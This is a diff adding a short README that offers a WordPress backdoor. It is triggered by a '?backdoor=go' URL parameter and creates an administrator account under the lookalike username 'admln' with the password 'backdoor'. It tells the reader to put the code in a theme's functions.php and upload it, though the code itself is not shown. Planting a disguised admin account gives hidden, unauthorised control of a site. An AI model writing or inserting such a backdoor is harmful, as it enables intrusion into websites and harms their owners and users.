@@ -1,0 +1,4 @@
+Easily usable backdoor, when visitinng http://example.com?backdoor=go
+
+Just add code to the theme function.php and upload.
+Password will be backdoor and username will be admln  thats A D M L N < in lowercase.
